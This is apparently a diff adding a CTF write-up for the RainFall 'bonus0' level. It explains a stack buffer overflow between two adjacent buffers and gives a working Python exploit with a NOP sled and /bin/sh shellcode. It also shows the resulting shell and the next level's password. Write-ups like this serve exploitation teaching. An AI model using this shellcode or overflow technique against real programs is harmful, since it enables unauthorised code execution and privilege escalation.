@@ -1,0 +1,28 @@
+The bonus0 program takes user input twice and concatenate them before printing the resulting concatenation.
+When we disassemble it, we can see 2 functions:
+The function `p` which takes a buffer and a string literal and reads user input before truncating at the first newline and putting the first 20 characters in the buffer.
+The function `pp` which takes a buffer as a parameter and creates 2 stack-allocated arrays and calls `p` with both of these arrays, before copying them into the buffer separated by a space.
+
+We can abuse the fact that the buffer created in the function `pp` are stack allocated and therefore sequential in memory, it means if we write too far in the second buffer, we can end up writing on the first.
+
+We will use the buffer used to temporarily store the user input to store and run our shellcode exploit.
+
+The layout of our exploit will be as follow:
+- bytes 0-4095: NOPs + shellcode + filler bytes, we need enough NOPs so that we won't overwrite when we perform the second read
+- byte 4096: '\n', required for `p`
+- bytes 4096-4109: filler bytes, just enough to overwrite `eip`
+- bytes 4109-4113: address read by the instruction pointer when we overflow, in this case we want to point somewhere in the middle of the NOPs written above
+- rest: Some filler bytes to cause the overflow, but not too much as we don't want to overwrite our shellcode
+
+There are many different possible layouts for this exploit, here is the one we've used:
+`python -c "print '\x90' * 2096 + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'a' * 1971 + '\n' + 'abcdefghiaaaa' + '\xbf\xff\xee\x70'[::-1] + 'nop' + '\x90' * 56"`
+
+bonus0@RainFall:~$ (python -c "print '\x90' * 2096 + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'a' * 1971 + '\n' + 'abcdefghiaaaa' + '\xbf\xff\xee\x70'[::-1] + 'nop' + '\x90' * 56"; cat) | ./bonus0
+ -
+ -
+��������������������efghiaaaap���nop������ efghiaaaap���nop������
+whoami
+bonus1
+cd ../bonus1
+cat .pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
